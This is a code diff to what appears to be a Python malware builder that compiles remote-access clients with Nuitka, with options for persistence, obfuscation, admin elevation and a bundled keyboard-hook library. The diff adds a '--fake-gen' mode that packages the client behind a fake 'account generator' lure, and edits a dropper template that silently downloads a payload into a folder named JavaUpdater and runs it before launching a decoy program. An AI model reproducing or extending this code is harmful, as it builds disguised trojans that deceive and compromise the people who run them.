@@ -81,7 +81,12 @@ parser.add_argument('--admin',
                     dest='adm',
                     default=False,
                     help='Demande une autorisation Administrateur au lancement du programme')
-
+parser.add_argument('--fake-gen',
+                    type=str,
+                    required=False,
+                    dest='name_fake_gen',
+                    default='',
+                    help='Génere un faux générateur de compte')
 args = parser.parse_args()
 
 class GenClient:
@@ -91,7 +96,7 @@ class GenClient:
     pathDirHttp = "./http/"
     appdata = os.path.expandvars("%AppData%").replace("\Roaming","")
 
-    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe, adm):
+    def GenererClient(self, ip, port, persistance, name, freeze, obf, icon, path_exe, adm, name_fake_gen):
         fin_dropeur = """)))))
     except Exception as e:
         print(str(e))
@@ -130,35 +135,9 @@ class GenClient:
         fichier.close()
         if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
             os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
-        # si l'options freeze est choisi
-        if path_exe == "": ###--include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\=data\\pyHook\\_cpyHook.cp37-win_amd64.pyd\"
-            if freeze: ### --onefile
-                ## Complier le loader
-                cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile".format(self.appdata)
-                if adm:
-                    cmd = cmd + " --windows-uac-admin"
-                #if not icon == "":
-                    #cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
-                cmd = cmd + " {}".format(self.pathDirOutput + "load_" + name + ".pyw")
-                os.system(cmd)
-                print("Compilation terminer")
-                print("Nettoyage des fichier temporaire")
-                # netoyyer fichier temporaire
-                shutil.copyfile("load_" + name + ".exe", self.pathDirOutput + name + ".exe")
-                if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
-                    os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
-                if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
-                    os.remove(self.pathDirOutput + "load_" + name + ".pyw")
-                if os.path.exists("load_" + name + ".exe"):
-                    os.remove("load_" + name + ".exe")
-                shutil.rmtree("load_" + name + ".dist/")
-                shutil.rmtree("load_" + name + ".build/")
-                shutil.rmtree("load_" + name + ".onefile-build/")
-
-                print("Client executable prêt : output/" + name + ".exe")
-            else:
-                print("Client prêt : output/" + "load_" + name + ".pyw")
-        else:
+        
+        # si l'option hide in exe est choisi
+        if not path_exe == "": ###--include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\=data\\pyHook\\_cpyHook.cp37-win_amd64.pyd\"
             ## Complier le loader
             cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
             os.system(cmd)
@@ -186,22 +165,23 @@ class GenClient:
             loader_hide_file = """import os
 import subprocess
 import urllib.request
-import os
+import psutil 
 pathAppData = os.getenv('APPDATA')
 pathDir = pathAppData + "\\\\JavaUpdater\\\\"
 if not os.path.exists(pathDir):
     os.makedirs(pathDir)
 if not os.path.exists(pathDir + "{}"):
     urllib.request.urlretrieve({},pathDir + "{}")
-cmd = "start " + pathDir + "{}"
-resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
-                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
+if not "{}" in (p.name() for p in psutil.process_iter()):
+    cmd = "start " + pathDir + "{}"
+    resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                            stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
 if not os.path.exists(pathDir + "{}"):
     urllib.request.urlretrieve({},pathDir + "{}")
 cmd = "start " + pathDir + "{}"
 resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                           stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
-os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, name_exe, url_safe, name_exe, name_exe)
+os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, name_payload, name_exe, url_safe, name_exe, name_exe)
 
             name_exe_no_ext, ext_exe  = os.path.splitext(os.path.basename(path_exe))
             fichier = open(self.pathDirOutput + name_exe_no_ext + ".pyw", "w")
@@ -232,6 +212,75 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
             Company Name
             FileDescription
             """
+        # si l'options freeze est choisi
+        if freeze: ### --onefile
+            ## Complier le loader
+            cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile".format(self.appdata)
+            if adm:
+                cmd = cmd + " --windows-uac-admin"
+            #if not icon == "":
+                #cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
+            cmd = cmd + " {}".format(self.pathDirOutput + "load_" + name + ".pyw")
+            os.system(cmd)
+            print("Compilation terminer")
+            print("Nettoyage des fichier temporaire")
+            # netoyyer fichier temporaire
+            shutil.copyfile("load_" + name + ".exe", self.pathDirOutput + name + ".exe")
+            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
+                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
+            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
+                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
+            if os.path.exists("load_" + name + ".exe"):
+                os.remove("load_" + name + ".exe")
+            shutil.rmtree("load_" + name + ".dist/")
+            shutil.rmtree("load_" + name + ".build/")
+            shutil.rmtree("load_" + name + ".onefile-build/")
+
+            print("Client executable prêt : output/" + name + ".exe")
+            return True
+        else:
+            print("Client prêt : output/" + "load_" + name + ".pyw")
+        # si l'options fake-gen est choisi
+        if not name_fake_gen == "":
+            ## Complier le loader
+            cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile".format(self.appdata)
+            if adm:
+                cmd = cmd + " --windows-uac-admin"
+            #if not icon == "":
+                #cmd = "py -m nuitka --follow-imports --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\" --windows-disable-console --onefile {}".format(self.appdata, self.pathDirOutput + "load_" + name + ".pyw")
+            cmd = cmd + " {}".format(self.pathDirOutput + "load_" + name + ".pyw")
+            os.system(cmd)
+            print("Compilation terminer")
+            print("Nettoyage des fichier temporaire")
+            # netoyyer fichier temporaire
+            shutil.copyfile("load_" + name + ".exe", self.pathDirHttp + name + ".exe")
+            if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
+                os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
+            if os.path.exists(self.pathDirOutput + "load_" + name + ".pyw"):
+                os.remove(self.pathDirOutput + "load_" + name + ".pyw")
+            if os.path.exists("load_" + name + ".exe"):
+                os.remove("load_" + name + ".exe")
+            shutil.rmtree("load_" + name + ".dist/")
+            shutil.rmtree("load_" + name + ".build/")
+            shutil.rmtree("load_" + name + ".onefile-build/")
+
+            ## Ecrire le generateur
+            gen_name = name_fake_gen + "Generator.pyw"
+            fichier = open(self.pathDirHttp + gen_name, "w")
+            fichier.write("""from tkinter import *
+import random
+import string
+from tkinter import ttk
+import threading
+import ctypes
+import inspect""")
+            fichier.write("\nname_app = \"{}\"".format(name_fake_gen))
+            fichier.write(self.ReturnFichier("gen.txt"))
+            fichier.close()
+
+            return True
+
+            
 
     def ReturnFichier(self, nom_fichier):
         fichier = open(self.pathDirFichier + nom_fichier, "r")
@@ -253,6 +302,19 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
             return fileVersionNumber, companyName, fileDescription
 
 if args.freeze == False and args.path_exe == "" and args.adm == True:
+    print("Options incompatible")
     os._exit(0)
 
-GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon, args.path_exe, args.adm)
+if args.freeze == True and not args.path_exe == "":
+    print("Options incompatible")
+    os._exit(0)
+
+if args.freeze == True and not args.name_fake_gen == "":
+    print("Options incompatible")
+    os._exit(0)
+
+if not args.name_fake_gen == "" and not args.path_exe == "":
+    print("Options incompatible")
+    os._exit(0)
+
+GenClient().GenererClient(args.host, args.port, args.persistance, args.name, args.freeze, args.obf, args.icon, args.path_exe, args.adm, args.name_fake_gen)
